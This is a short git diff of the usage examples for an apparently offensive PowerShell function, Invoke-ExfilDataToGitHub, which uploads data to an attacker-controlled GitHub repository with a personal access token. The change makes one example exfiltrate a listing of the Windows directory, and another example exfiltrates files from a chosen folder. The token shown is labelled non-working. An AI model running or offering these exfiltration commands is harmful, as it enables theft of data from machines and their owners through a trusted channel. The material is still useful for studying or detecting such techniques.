@@ -44,7 +44,7 @@ Recursively get files from subdirectories of given local filepath
 # This example exfiltrates data to a file - keys do not work
 
 Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ==" 
-                                                -GHFilePath "testfolder/" -GHFileName "testfile3" -Data "a bit of test data"
+                                                -GHFilePath "testfolder/" -GHFileName "testfile3" -Data (dir c:\Windows | Out-String )
 .EXAMPLE
 # This example exfiltrates files from a given directory and filter
 Invoke-ExfilDataToGitHub -GHUser nnh100 -GHRepo exfil -GHPAT "ODJiZGI5ZjdkZTA3MzQzYWU5MGJjNDA3ZWU2NjQxNTk0MzllZ=="
